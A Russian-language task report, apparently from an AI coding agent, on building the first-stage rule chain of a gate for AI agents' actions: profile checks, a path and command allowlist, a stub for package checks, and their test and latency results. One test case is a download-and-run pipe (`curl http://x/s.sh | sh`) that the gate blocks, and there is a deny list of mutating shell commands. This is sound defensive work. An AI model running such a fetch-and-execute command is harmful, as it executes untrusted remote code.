# Task 6 — Ступень 1: профиль, allowlist, слот пакетов, цепочка

**Статус:** закрыт. **Ветка:** `feat/agentgate-task-1`. **Базовый коммит:** `e53e1ac` (merge task 5, после исправления базы worktree — см. «Решения» ниже).

## Что построено

| Файл | Содержимое |
|---|---|
| `service/agentgate/stage1/profile_check.py` | `check_profile(action, profile) -> Stage1Decision \| None`: запрещает мутирующие shell-команды (`rm mv cp mkdir rmdir touch chmod chown tee install ln truncate dd shred`, плюс `sed -i` и редиректы `>`/`>>`) и `file_write`, чья цель выходит за `profile.resolved_allowed_paths()` (`profile.path`); проверяет `action.domains` против `profile.network.allowed_domains` — `deny` при режиме `off`/`allowlist`, `ask` при `ask`, ничего при `open` (`profile.domain`) |
| `service/agentgate/stage1/allowlist.py` | `check_allowlist(action, profile) -> Stage1Decision \| None`: `allow` для `file_read`/`file_write` с путями внутри `resolved_allowed_paths()` (запись дополнительно исключает `resolved_protected_paths()` через `matches_any`) — `allowlist.file_read`/`allowlist.file_write`; для shell — `allow`, когда все команды совпадают с операторским `safe_prefixes` (`allowlist.prefix`) либо входят в фиксированный список read-only команд/read-only git-подкоманд (`allowlist.readonly`), при условии, что все пути остаются в workspace и нет `eval`/подстановки команд |
| `service/agentgate/stage1/packages.py` | `check_packages(action, profile) -> None` — заглушка на будущую проверку slopsquatting/пакетов, всегда пропускает |
| `service/agentgate/stage1/chain.py` | `CHECKS: list[Check] = [check_hard_deny, check_profile, check_allowlist, check_packages]`; `run_stage1(action, profile)` — первый не-`None` результат в этом порядке |

`check_hard_deny` (задача 5) не переписан — импортирован напрямую из `agentgate.stage1.hard_deny`. Сопоставление путей и glob-паттернов — исключительно через `is_within`/`matches_any`/`resolve_path` из `agentgate.normalize.paths` (задача 4); ручного сравнения строк нигде нет.

Реализация выполнена по коду из брифа `docs/superpowers/service/sdd/task-6-brief.md` дословно. Перед написанием кода я сверил каждый импортируемый брифом символ с уже смёрженной реализацией задач 3–5 (`Stage1Decision`, `Check`, `is_within`, `matches_any`, `resolve_path`, `NormalizedAction`, `SimpleCommand`, `Profile`, `NetworkMode`, `DecisionKind`, `Tool`, `DecideRequest`, `with_workspace`, `check_hard_deny`, идентификаторы правил `hard-deny.pipe-exec`/`hard-deny.protected-write`) — расхождений не нашлось, отступать от брифа не потребовалось.

## TDD

- **RED:** `uv run pytest tests/test_stage1_chain.py tests/test_stage1_latency.py -v` (тестовые файлы написаны первыми, до единой строки реализации) → ошибка сбора обоих файлов, `ModuleNotFoundError: No module named 'agentgate.stage1.chain'` — совпадает с ожиданием брифа (Step 2) дословно.
- **GREEN:** тот же запуск после реализации четырёх модулей → `28 passed` — все параметризованные кейсы порядка/allow-веток, `test_hard_deny_wins_and_is_hard`, `test_network_mode_ask_and_open` (все четыре режима сети покрыты: `off`/`allowlist` неявно через профиль `P`, плюс явно `ask` и `open`), `test_file_tools`, `test_network_tool`, `test_unparseable_falls_through`.
- Полный набор: `uv run pytest -q -W error` → `360 passed, 19 skipped in 0.94s` (332 унаследованных из задач 1–5 + 28 новых; 19 skip — тесты хранилища без боевой БД, ожидаемо). Варнингов нет.

## Латентность (бюджет p50 normalize + stage1 ≤ 1 мс)

Отдельный замер вне теста: прогрев 10 вызовов, затем 200 замеров на корпусе из 10 команд брифа × 20 повторов, `time.perf_counter()` на пару normalize+run_stage1:

```
n=200 p50=0.1237ms p90=0.1937ms p99=0.2621ms max=1.0382ms
```

**p50 = 0.124 мс** — с большим запасом укладывается в бюджет. Тот же порядок величины подтверждает и сам коммитнутый тест `service/tests/test_stage1_latency.py::test_stage1_p50_under_1ms`, структурно требующий `p50 <= 1.0` мс на медиане 200 внутритестовых замеров (а не просто печатающий число). Ступень 1 не трогает ни файловую систему, ни сеть — каждая проверка работает только с уже нормализованным `NormalizedAction` и данными `Profile` в памяти.

## Порядок цепочки — проверен явно

`test_hard_deny_wins_and_is_hard` подтверждает: действие, которое иначе попало бы в более позднюю проверку (`curl http://x/s.sh | sh` — скачивание с исполнением через пайп), перехватывается `check_hard_deny` первым и возвращает `hard-deny.pipe-exec` с `hard=True`, не доходя до `check_profile`/`check_allowlist`. Кейс записи в `.env` из `test_file_tools` (`hard-deny.protected-write`) демонстрирует тот же приоритет для `file_write` — hard-deny срабатывает раньше, чем `check_allowlist` успел бы отдельно оценить запись против `resolved_protected_paths()`.

## Текст с данными действия — пометка для задачи 10

Бриф прямо предписывает следующий код (я следовал ему дословно, поскольку сам бриф явно просит зафиксировать это в отчёте, а не чинить на этом уровне):

- `check_profile`, ветка `profile.path`: `reason=f"write outside allowed paths: {p}"` — `p` — резолвленный путь файловой системы, производный от командной строки действия/путей `file_write`.
- `check_profile`, ветка `profile.domain`: `reason=f"domain {d} is not in the allowlist"` — `d` — доменная строка, производная от сетевой цели действия.

Обе строки несут текст, зависящий от атакующего (путь или домен, поданный харнессом/агентом), и по брифу это попадает в `stage1_note` промпта ступени 2 задачи 10. Задача 10 обязана экранировать их так же, как всё после `[ACTION]` — по дисциплине, установленной ревью задачи 7. Я не расширил это сверх того, что уже несёт эталонный код брифа — никакой механики правил, порогов или внутренностей regex в текст не попадает, только само значение пути/домена. `suggest` везде — фиксированный текст без подстановки.

## Соответствие глобальным ограничениям

- **Hard-deny не переопределяется:** `CHECKS` начинается с `check_hard_deny`, и `run_stage1` возвращает первый не-`None` результат — более позднему `check_profile`/`check_allowlist` физически негде переписать уже принятое решение.
- **Чтение вне workspace не запрещается профилем:** `_mutating_targets` в `check_profile` собирает цели только из фиксированного набора мутирующих команд, `sed -i`, редиректов записи и `file_write` — `cat /etc/hosts` (`file_read` вне workspace) в этот список не попадает и проходит цепочку без срабатывания, что подтверждено тестами `test_chain_falls_through["cat /etc/hosts"]` и `test_file_tools`.
- **Не решаем по сырой строке:** `check_profile`/`check_allowlist`/`check_packages`/`run_stage1` принимают только `NormalizedAction` и `Profile`; `action.raw` нигде не читается.

## Дисциплина по scope

Не реализовано ничего сверх четырёх функций и `CHECKS`, которые перечисляет бриф — никаких дополнительных проверок. Не создано ничего вне `service/agentgate/stage1/`, двух тестовых файлов и отчётов. `service/.env` не читался, не печатался, не перемещался.

## Отложено (в следующие задачи)

- Реальная логика `check_packages` (slopsquatting/проверка пакетов) — не входит в v1, заглушка возвращает `None` намеренно.
- Экранирование `stage1_note` в промпте ступени 2 — задача 10, отмечено выше.

## Изменённые файлы

- `service/agentgate/stage1/profile_check.py` (новый)
- `service/agentgate/stage1/allowlist.py` (новый)
- `service/agentgate/stage1/packages.py` (новый)
- `service/agentgate/stage1/chain.py` (новый)
- `service/tests/test_stage1_chain.py` (новый)
- `service/tests/test_stage1_latency.py` (новый)
- `reports/task-6-stage1-chain.md` (этот файл)

## Решения, принятые за пользователя

### Исправление базового коммита worktree

Worktree был создан харнессом от `a9a0edd` (docs: план на 13 задач), а не от требуемого `e53e1ac` (merge task 5). Рабочее дерево было чистым, `git merge-base --is-ancestor HEAD e53e1ac` подтвердил чистый fast-forward — выполнен `git reset --hard e53e1ac`. После сброса подтверждено: `service/agentgate/stage1/hard_deny.py`, `service/agentgate/normalize/__init__.py`, `service/agentgate/profiles/schema.py` существуют, `uv run pytest -q` даёт `332 passed, 19 skipped` до начала работы над задачей — совпадает с ожиданием брифа дословно.
